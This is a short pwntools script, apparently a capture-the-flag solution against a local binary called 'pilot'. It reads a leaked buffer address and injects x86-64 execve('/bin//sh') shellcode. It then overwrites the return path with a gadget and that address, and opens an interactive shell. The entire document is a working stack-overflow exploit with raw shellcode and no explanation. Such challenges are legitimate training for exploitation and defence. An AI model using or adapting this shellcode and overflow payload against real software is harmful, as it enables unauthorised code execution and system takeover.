from pwn import *
import sys

proc = process("./pilot")
print(proc.recvuntil(b"Location:"))
buffer_addr = proc.recvline()
#print(buffer_addr)
buffer_addr = int(buffer_addr.strip(), 16)

print(hex(buffer_addr))


shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
shellcode = shellcode.ljust(40, b'A')

# + b"X"*(48-len(shellcode)) + 
payload = shellcode + p64(0x400b73) + p64(buffer_addr)

print(proc.recvuntil(b":"))
proc.sendline(payload)
proc.interactive()
